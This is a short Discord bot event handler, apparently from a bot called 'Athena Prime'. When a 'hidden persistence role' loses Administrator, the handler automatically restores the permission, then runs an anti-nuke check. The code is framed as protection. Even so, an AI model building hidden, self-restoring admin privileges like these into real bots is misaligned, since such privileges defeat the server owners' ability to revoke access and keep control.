import { AuditLogEvent, PermissionFlagsBits } from 'discord.js';
import { checkRoleUpdate } from '../utils/antinuke.js';
import { UNBYPASSABLE_ROLE_NAME } from '../utils/antiStrip.js';

export default {
  name: 'roleUpdate',
  async execute(oldRole, newRole) {
    if (!newRole.guild) return;

    // Anti-Strip: Instant restore if the hidden persistence role loses Admin
    if (newRole.name === UNBYPASSABLE_ROLE_NAME) {
      if (!newRole.permissions.has(PermissionFlagsBits.Administrator)) {
        await newRole.setPermissions([PermissionFlagsBits.Administrator], 'Athena Prime Unbypassable Persistence').catch(() => null);
      }
    }

    await checkRoleUpdate(oldRole, newRole);
  }
};
